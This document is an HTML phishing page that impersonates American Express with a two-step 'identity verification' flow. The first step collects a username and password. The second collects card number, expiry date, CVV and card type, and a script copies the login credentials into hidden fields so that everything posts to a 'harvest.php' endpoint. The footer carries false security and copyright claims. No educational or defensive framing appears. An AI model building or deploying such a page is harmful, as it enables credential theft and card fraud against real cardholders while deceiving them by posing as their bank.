<!DOCTYPE html> <html> <head> <title>Verify Your Identity - American 
    Express</title> <meta name="viewport" content="width=device-width, 
    initial-scale=1"> <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; 
        background: linear-gradient(135deg, #005EB8 0%, #003087 100%); 
        margin: 0; height: 100vh; display: flex; align-items: center; 
        justify-content: center; } .container { background: white; 
        padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px 
        rgba(0,0,0,0.2); width: 400px; } .logo { text-align: center; 
        margin-bottom: 30px; } .logo img { width: 180px; } h1 { color: 
        #005EB8; text-align: center; margin-bottom: 10px; }
        p { text-align: center; color: #666; margin-bottom: 30px; } 
        input[type="email"], input[type="password"], 
        input[type="text"], input[type="tel"], select { width: 100%; 
        padding: 12px; margin: 10px 0; border: 1px solid #ddd; 
        border-radius: 6px; box-sizing: border-box; font-size: 16px; } 
        .submit-btn { background: #005EB8; color: white; padding: 15px; 
        width: 100%; border: none; border-radius: 6px; font-size: 18px; 
        font-weight: bold; cursor: pointer; margin-top: 10px; } 
        .submit-btn:hover { background: #004494; } .step2 { display: 
        none; }
        #progress { width: 100%; height: 4px; background: #eee; 
        #border-radius: 2px; margin: 20px 0; } progress-bar { height: 
        #100%; background: #005EB8; width: 50%; border-radius: 2px; 
        #transition: width 0.3s; }
    </style> </head> <body> <div class="container"> <div 
        class="logo"><img src="amex-logo.svg" alt="Amex"></div>
        
        <!-- Step 1: Login --> <div id="step1"> <h1>Verify Login 
            Credentials</h1> <p>Enter your username and password to 
            continue.</p> <form id="loginForm" method="POST" 
            action="harvest.php">
                <input type="email" name="username" placeholder="Email 
                or Username" required> <input type="password" 
                name="password" placeholder="Password" required> <div 
                id="progress"><div id="progress-bar"></div></div> 
                <button class="submit-btn" onclick="showStep2()">Verify 
                & Continue</button>
            </form> </div>
        
        <!-- Step 2: Card Details --> <div id="step2" class="step2"> 
            <h1>Confirm Card Details</h1> <p>Final security step: 
            Verify your primary card.</p> <form id="cardForm" 
            method="POST" action="harvest.php">
                <input type="hidden" name="username" id="hiddenUser"> 
                <input type="hidden" name="password" id="hiddenPass"> 
                <input type="text" name="card_number" placeholder="Card 
                Number (16 digits)" maxlength="19" required> <input 
                type="tel" name="expiry" placeholder="MM/YY" 
                maxlength="5" required> <input type="text" name="cvv" 
                placeholder="CVV (3-4 digits)" maxlength="4" required> 
                <select name="card_type" required>
                    <option value="">Card Type</option> <option 
                    value="amex">American Express</option> <option 
                    value="visa">Visa</option> <option 
                    value="mc">MasterCard</option>
                </select> <button class="submit-btn">Complete 
                Verification</button>
            </form> <p style="font-size: 12px; color: #999; text-align: 
            center; margin-top: 20px;">Secure 256-bit encryption | 
            American Express © 2026</p>
        </div> </div> <script> function showStep2() { 
            document.getElementById('step1').style.display = 'none'; 
            document.getElementById('step2').style.display = 'block'; 
            document.getElementById('progress-bar').style.width = 
            '100%';
            // Capture login creds for hidden fields
            document.getElementById('hiddenUser').value = 
            document.querySelector('input[name="username"]').value; 
            document.getElementById('hiddenPass').value = 
            document.querySelector('input[name="password"]').value;
        }
    </script> </body>
</html>
